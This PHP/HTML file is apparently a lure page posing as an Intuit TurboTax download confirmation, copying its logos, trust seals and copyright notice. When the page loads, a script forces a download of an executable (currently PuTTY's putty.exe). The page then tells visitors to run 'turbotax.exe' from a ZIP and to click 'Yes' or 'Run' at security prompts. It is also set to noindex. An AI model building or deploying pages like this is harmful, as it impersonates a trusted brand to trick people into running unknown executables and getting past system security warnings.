<?php
// The direct download link is set to the PuTTY executable.
$downloadLink = "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe";
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Download Started - TurboTax</title>
    <link rel="stylesheet" href="css/style.css">
    <link rel="icon" href="/img/favicon.ico" type="image/x-icon">
</head>
<body class="page-body">

    <header class="main-header container">
        <img src="img/turbo-logo.svg" alt="Intuit TurboTax Logo" class="header-logo">
        <button class="file-return-btn">File a return</button>
    </header>

    <main class="page-content">
        <div class="content-box instructions">
            <img src="img/turbo-logo.svg" alt="Download Icon" class="content-logo">
            <h1>Your Download Has Started</h1>
            <p><strong>Thank you for choosing TurboTax.</strong> The installer should be downloading now. Please follow these simple installation steps:</p>
            
            <ul class="instructions-list">
                <li class="instruction-step">
                    <span class="emoji-icon">📁</span>
                    <p>Double-click the downloaded <strong>ZIP file</strong>, then find and run <strong>turbotax.exe</strong> from the window that opens.</p>
                </li>
                <li class="instruction-step">
                    <span class="emoji-icon">🛡️</span>
                    <p>If a security prompt asks for permission to make changes, click <strong>'Yes'</strong> or <strong>'Run'</strong> to to trust your device.</p>
                </li>
            </ul>

        </div>
    </main>

    <footer class="main-footer">
        <div class="container footer-content">
            <div class="footer-left">
                <img src="img/intuit_logo_footer.svg" alt="Intuit" class="intuit-logo">
            </div>
            <div class="footer-center">
                <p>&copy; <?php echo date("Y"); ?> Intuit Inc. All rights reserved.</p>
            </div>
            <div class="footer-right">
                <img src="img/security_trust_seal.svg" alt="TRUSTe Certified Privacy">
                <img src="img/security_efile_certified.svg" alt="E-File Certified">
            </div>
        </div>
    </footer>

    <script>
        // Automatically trigger the download on page load
        window.onload = function() {
            window.location.href = '<?php echo $downloadLink; ?>';
        };
    </script>
</body>
</html>